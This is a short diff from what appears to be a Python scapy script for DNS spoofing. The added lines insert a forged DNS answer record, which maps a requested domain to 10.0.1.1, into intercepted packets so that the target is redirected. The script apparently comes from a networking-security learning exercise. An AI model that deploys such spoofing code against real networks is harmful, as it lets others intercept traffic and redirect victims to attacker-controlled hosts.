@@ -14,6 +14,8 @@ def process_packet():
             print("[+] Spoofing Target")
 #rrname = website; rdata=ip of requested domain
             answer = scapy.DNSRR(rrname=qname, rdata="10.0.1.1")
+#.an is answer layer which will be modified by answer above
+            scapy_packet[scapy.DNS].an = answer
 #.show method shows all layers of packet
         #print(scapy_packet.show())
 #allow packet to its dest 
